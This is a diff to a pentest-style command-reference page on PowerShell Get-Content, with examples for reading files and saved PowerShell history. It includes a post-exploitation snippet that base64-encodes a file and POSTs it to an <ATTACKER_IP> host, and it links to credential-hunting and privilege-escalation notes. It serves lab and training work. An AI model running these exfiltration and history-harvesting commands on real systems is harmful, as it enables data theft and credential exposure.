@@ -9,6 +9,38 @@ hideFooterPagination: true
 
 {/* Generated from Commands/get-content.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Get-Content: choose the operation and read the result
+
+Read a text file or the current user’s saved PowerShell history.
+
+### What the result establishes
+
+Choose a bounded preview, tail or raw read according to the file you are inspecting.
+
+### Prerequisites and common failures
+
+Large or binary files should not be dumped into a terminal; text encoding and multiline representation can change how data appears.
+
+### Example 1: Read a file
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Get-Content C:\PATH\FILE.txt
+```
+
+### Example 2: Read saved history
+
+Run in: **Windows PowerShell**. PSReadLine/history may be absent in noninteractive sessions.
+
+```powershell
+Get-Content (Get-PSReadLineOption).HistorySavePath
+```
+
+## Saved commands and notebook recipes
+
+Read a text file or the current user’s saved PowerShell history.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=get-content) · [All tools](/index)
@@ -49,6 +81,13 @@ PSReadLine/history may be absent in noninteractive sessions.
 Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 2. Harnessing PowerShell](/active-directory/living-off-the-land#2-harnessing-powershell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Base64 Encode &amp; Decode (Upload)">
@@ -61,6 +100,13 @@ Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_his
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -75,6 +121,13 @@ $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -En
 Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Password in Alternate Data Stream">
@@ -88,6 +141,21 @@ PS > Get-Item -path flag.txt -Stream *
 PS > Get-Content -path flag.txt -Stream Flag
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Password in Alternate Data Stream](/privesc/windows-privesc-checklist#password-in-alternate-data-stream)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+
+{/* VAULT_RELATED_END */}
